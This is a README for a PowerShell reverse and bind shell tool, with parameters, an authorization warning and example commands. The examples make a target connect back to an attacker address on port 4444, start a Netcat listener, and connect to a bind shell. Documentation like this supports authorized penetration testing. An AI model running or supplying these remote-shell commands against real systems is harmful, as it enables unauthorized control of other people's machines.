---

# PowerShell Reverse Shell Script - Documentation

## Overview

This script, developed by **dpckah001**, is a PowerShell-based reverse shell and bind shell utility. It allows you to remotely control a Windows machine by connecting back to an attacker machine (reverse shell) or by listening for incoming connections (bind shell).

## Features

- **Reverse Shell**: The target system connects back to the attacker's machine, allowing the attacker to send commands and receive output.
- **Bind Shell**: The target system opens a port and listens for incoming connections from the attacker.
- Compatible with standard tools such as Netcat.
- Customizable IP address and port.
- Real-time command execution with interactive PowerShell prompt.

## Usage

The script supports two primary modes:
- **Reverse Shell**: Connects back to a listener running on the attacker's machine.
- **Bind Shell**: Opens a port on the target system and waits for incoming connections.

### Parameters

- `-IPAddress`: The IP address to connect to (for reverse shell).
- `-Port`: The port to connect to or listen on.
- `-Reverse`: Switch to enable reverse shell mode.
- `-Bind`: Switch to enable bind shell mode.

### Requirements

- Windows system with PowerShell support.
- A listener on the attacker's machine (Netcat or similar).

## Examples

### Reverse Shell

In this example, the script runs on the target machine and connects back to the attacker's machine at IP `192.168.1.100` on port `4444`.

```powershell
Invoke-PowerShellTcp -Reverse -IPAddress "192.168.1.100" -Port 4444
```

On the attacker's machine, you need to set up a listener:

```bash
nc -lvnp 4444
```

Once the connection is established, the attacker can interact with the target machine using PowerShell commands.

### Bind Shell

This example demonstrates running the script in bind mode, where it listens for incoming connections on port `4444`.

```powershell
Invoke-PowerShellTcp -Bind -Port 4444
```

The attacker can then connect to the target machine's IP and port:

```bash
nc <target IP address> 4444
```

Once connected, the attacker will receive an interactive PowerShell shell.

## How to Use

1. **Reverse Shell**: Use the `-Reverse` switch along with the attacker's IP and port to connect back.
   
   Example:
   ```powershell
   Invoke-PowerShellTcp -Reverse -IPAddress "192.168.1.100" -Port 4444
   ```

2. **Bind Shell**: Use the `-Bind` switch to listen on a specified port.
   
   Example:
   ```powershell
   Invoke-PowerShellTcp -Bind -Port 4444
   ```

3. On the attacker's machine, use `Netcat` (or a similar tool) to set up a listener for reverse shells or connect to bind shells.

4. After the connection is established, commands can be sent to the target system, and results will be returned interactively.

## Error Handling

If any issues arise during the connection or execution of commands, the script will attempt to handle errors and output relevant error messages. Examples of potential errors include:
- Failed connection to the target IP and port.
- Command execution errors on the target system.

## Notes

- **Security Warning**: This script is a potentially dangerous tool if used maliciously. Ensure you have authorization to run this script on any target system.
- **Legal Use**: This script should only be used for legitimate security assessments and with permission from the system's owner.

## Credits

Developed by **dpckah001**.

---

This `.md` file explains how to use the script, provides examples, and includes detailed information on parameters and error handling.